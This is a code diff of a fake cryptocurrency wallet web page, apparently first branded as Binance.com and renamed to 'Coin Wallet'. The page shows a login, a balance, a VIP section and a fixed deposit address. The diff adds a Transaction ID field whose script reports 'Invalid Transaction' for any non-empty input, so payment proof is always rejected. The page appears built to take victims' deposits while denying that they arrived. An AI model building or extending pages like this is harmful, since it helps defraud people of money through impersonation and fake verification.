@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Binance.com Wallet</title>
+<title>Coin Wallet</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
@@ -73,11 +73,11 @@ body{
 }
 .balance{
     font-size:34px;
-    font-weight:600; /* أخف وزن من السابق */
+    font-weight:600;
     margin-top:6px;
 }
 .balance span{
-    font-weight:600; /* USDT أخف وزن */
+    font-weight:600;
     font-size:28px;
 }
 .pnl{
@@ -164,6 +164,42 @@ body{
     word-break:break-all;
 }
 
+/* Transaction ID */
+.transaction-id-label{
+    margin-top:15px;
+    font-weight:600;
+}
+.transaction-id-input{
+    width:100%;
+    padding:10px;
+    border-radius:12px;
+    border:none;
+    margin-top:5px;
+    background:#0b0f14;
+    color:#fff;
+}
+
+/* NEXT BUTTON */
+.next-btn{
+    width:100%;
+    padding:12px;
+    margin-top:12px;
+    background:#f5c542;
+    border:none;
+    border-radius:12px;
+    cursor:pointer;
+    font-weight:600;
+}
+
+/* ERROR MESSAGE */
+#errorMsg{
+    color:#ff4c4c;
+    text-align:center;
+    margin-top:10px;
+    display:none;
+    font-weight:600;
+}
+
 /* BACK */
 .back-btn{
     background:#1a2230;
@@ -180,7 +216,7 @@ body{
 <body>
 <div class="container">
 
-<div class="site-name">Binance.com</div>
+<div class="site-name">Coin Wallet</div>
 
 <!-- LOGIN -->
 <div class="login-box" id="loginPage">
@@ -249,6 +285,16 @@ body{
         <div class="wallet-address">
             TBYFfFTbwFrTDJNhK8FJ9kazD3CJfPYwGS
         </div>
+
+        <!-- Transaction ID -->
+        <p class="transaction-id-label">Transaction ID:</p>
+        <input type="text" id="transactionID" placeholder="Enter your Transaction ID" class="transaction-id-input">
+
+        <!-- Next Button -->
+        <button id="nextBtn" class="next-btn">Next</button>
+
+        <!-- Error Message -->
+        <p id="errorMsg">Invalid Transaction</p>
     </div>
 </div>
 
@@ -266,14 +312,28 @@ function login(){
         alert("Invalid login");
     }
 }
+
 function goVIP(){
     walletPage.style.display="none";
     vipPage.style.display="block";
 }
+
 function backToWallet(){
     vipPage.style.display="none";
     walletPage.style.display="block";
 }
+
+// Transaction ID Next Button
+document.getElementById("nextBtn").addEventListener("click", function(){
+    const tx = document.getElementById("transactionID").value.trim();
+    if(tx !== ""){ 
+        const error = document.getElementById("errorMsg");
+        error.style.display = "block"; 
+        setTimeout(() => {
+            error.style.display = "none"; 
+        }, 2000);
+    }
+});
 </script>
 
 </body>
